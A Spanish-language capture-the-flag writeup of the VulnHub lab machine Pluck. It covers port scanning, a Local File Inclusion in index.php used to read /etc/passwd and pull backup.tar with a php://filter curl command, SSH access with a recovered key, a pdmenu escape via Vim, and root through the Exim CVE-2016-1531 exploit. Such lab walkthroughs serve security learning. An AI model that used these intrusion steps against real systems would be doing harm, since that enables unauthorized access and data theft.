---
title: "Pluck VulnHub - writeup"
date: 2026-05-15 8:00:00 -0400
categories: [Writeups, VulnHub]
tags: [web, LFI, SUID]
image:
  path: /assets/img/Pluck/banner.png
  alt: "Pluck banner"
---

En esta publicación se relatará cómo se resolvió la máquina Pluck de la plataforma VulnHub.

| Autor | Dificultad | Sistema operativo | Plataforma |
|-------|------------|-------------------|------------|
| Ryan Oberto | Fácil | Linux | VulnHub |

# Sumario ejecutivo

La máquina Pluck presenta como vectores de entrada los servicios SSH (puerto 22), HTTP (puerto 80) y TFTP (puerto 69). En la fase de enumeración web, se identifica una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` de `index.php`, lo que permite leer archivos del sistema. Gracias a la información en `about.php`, se descubre que existen copias de seguridad accesibles.

La explotación inicial se realiza extrayendo el archivo `backup.tar` a través del servicio **TFTP**. Al descompressar el contenido, se obtienen diversas llaves privadas SSH, de las cuales una permite el acceso al sistema como el usuario `paul`. Aunque el usuario está limitado inicialmente por un menú interactivo (`pdmenu`), es posible evadir esta restricción mediante el uso de comandos de escape en herramientas integradas.

Para la **escalada de privilegios**, tras realizar una búsqueda de binarios con permisos SUID, se localiza el ejecutable `/usr/exim/bin/exim-4.84-7`. Mediante el uso de `searchsploit`, se identifica un exploit documentado para esta versión específica (**CVE-2016-1531**). Tras transferir y ejecutar el script de Bash `39535.sh`, se logra manipular las variables de entorno para forzar la ejecución de código arbitrario con privilegios de superusuario, obteniendo finalmente una shell como **root**. Debido a la sencillez de los vectores de explotación y la disponibilidad de exploits públicos para el escalado, la máquina se cataloga con una dificultad fácil.

## Hosts discovery (descubrimiento de hosts)

![](/assets/img/Pluck/1.png)

---

## Enumeración
Escaneo a puerto 22,80,3306
```bash
# Nmap 7.98 scan initiated Tue Apr 14 15:11:38 2026 as: /usr/lib/nmap/nmap -p 22,80,3306 -sCV -sS -Pn -vvv -oN nmap.txt -oX nmap.xml 192.168.0.153
Nmap scan report for pluck (192.168.0.153)
Host is up, received arp-response (0.00040s latency).
Scanned at 2026-04-14 15:11:39 -04 for 6s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFSQzgfwHXqd1xWOgf75774FzsNjlHCbQMrxD/YxArRbHivjZaqVegVI3sUiy6uO/DLcmnnjxEKpJq0QNWXIi438ctaJzDnxIeeY1WxFVNgxidy0TUdzAOPsclC9v4SeWJS1XnsrPpWWRyBI1J/KdYOtdwtJ3D7YBKONsDMokhotPiGYinBD+DYIyyWKVpNi/6Pj2PqrT1f9KZMlMdda1yEE4x0/vy0tABWnLAR9JlzbDkLY9JpFoZb7Cs+xcwpcj0JNHKnN5IfpyZZ+vGDRdxB4twukRBFkljAxkZb8/QUO83om4vTgr9eLMV4cgwIA8IJsi83puCMfiNrg+VfNwN
|   256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5PvwhQy4P3+wVM+Tl9dFNeO1MWbOR50xImivscOMxL6HRVDbyYSFE8anA/SQntiOFqIkgk16pHSYXB2w5sgzQ=
|   256 18:98:5a:5a:5c:59:e1:25:70:1c:37:1a:f2:c7:26:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC5tbgnjQoXQRDtMCFeK6iEMlBokAJpBWfNq15V7O/Wf
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Pluck
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)
MAC Address: 08:00:27:A4:3C:C0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 14 15:11:45 2026 -- 1 IP address (1 host up) scanned in 6.79 seconds

```

Al intentar hacer un escaneo a los 4 puertos no concretaba el escaneo, así que decidí excluir el último y hacerle un escaneo aparte.
Escaneo al puerto 5355, no se pudo determinar versión:
```bash
PORT     STATE SERVICE REASON
5355/tcp open  llmnr   syn-ack ttl 1
MAC Address: 08:00:27:A4:3C:C0 (Oracle VirtualBox virtual NIC)
```

| Vector | Servicio (Puerto) | Estado  | Qué permite                                                                                        | Qué intentar                  | Notas                                                          |
| ------ | ----------------- | ------- | -------------------------------------------------------------------------------------------------- | ----------------------------- | -------------------------------------------------------------- |
| 1      | ssh (22)          | Abierto | Acceso autenticado al sistema                                                                      | Buscar credenciales           |                                                                |
| 2      | http (80)         | Abierto | Gran abanico de vulnerabilidades web                                                               |                               |                                                                |
| 3      | 3306 (mysql)      | Abierto | Ver datos dentro de bases de datos, permite acceso remoto con credenciales                         |                               |                                                                |
| 4      | 5355 (llmnr)      | Abierto | Protocolo que usan sistemas para resolver nombres de hosts dentro de la red local cuando falla DNS | Interceptar solicitudes LLMNR | Investigar más sobre el protocolo y buscar herramientas útiles |

### HTTP

![index.php](/assets/img/Pluck/2.png)

Luego de enumerar y verificar todos los directorios de la página con gobuster, pasé a interceptar las peticiones con Burp Suite buscando algo interesante. Fue ahí cuando me di cuenta de una URL curiosa:

![](/assets/img/Pluck/3.png)

Esta URL está citando a un archivo interno de la máquina, y lo está resolviendo, así que intenté listar el `/etc/passwd` para ver si se acontecía un (LFI) Local File Inclusión:

![](/assets/img/Pluck/4.png)

Tenemos unos usuarios y un backup:
```
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
```

El `backup.sh` que señala el `/etc/passwd` contiene esto:
```bash
#!/bin/bash 
######################## # Server Backup script # ######################## 
#Backup directories in /backups so we can get it via tftp 

echo "Backing up data" 
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null 
echo "Backup complete"
```
Esto es interesante, tenemos un `backup.tar` que contiene `/home` y `/var/www/html`.

En el script dice que nos podemos conectar vía TFTP, esto se haría de la siguiente forma:
```bash
❯ tftp 192.168.0.153

tftp> get backup.tar
```

Otra forma de hacerlo en caso de no tener TFTP es con el wrapper de base64 de PHP.
Primero hay que conseguir el `.tar` en base64:
```bash
❯ curl http://192.168.0.153/index.php\?page\=php://filter/convert.base64-encode/resource\=/backups/backup.tar | grep 'jumbotron>' > raw.txt 
```

Limpiamos algunas cosas que quedan de HTML:
```bash
❯ sed -n 's/.*jumbotron>\(.*\)<.*/\1/p' raw.txt > clean.b64
```

Y decodificamos todo:
```bash
❯ base64 -d clean.b64 > backup.tar
```

---

## Explotación
Dentro del backup encontré varias llaves para SSH:

![](/assets/img/Pluck/5.png)

La `id_key4` es la correcta:

![](/assets/img/Pluck/6.png)

Como se vio en el `/etc/passwd`, la terminal es `pdmenu`:

![](/assets/img/Pluck/7.png)

Para escapar de aquí hay que seleccionar `Edit file` y nos abrirá Vim:

![](/assets/img/Pluck/8.png)

Ahora hay que cambiar la shell de Vim temporalmente con `:set shell=/bin/bash`, ya que por defecto está `pdmenu`.
Ahora solo es ejecutar `:shell`:

![](/assets/img/Pluck/9.png)

---

## Post Explotación
Al buscar binarios con privilegios SUID me percaté de esto:

![](/assets/img/Pluck/10.png)

Y buscando en Searchsploit encontré un script en bash que escala privilegios, así que decidí probarlo:

![](/assets/img/Pluck/11.png)

---

## Escalada de privilegios
Me transfiero el script y lo ejecuto consiguiendo acceso como root:

![](/assets/img/Pluck/12.png)
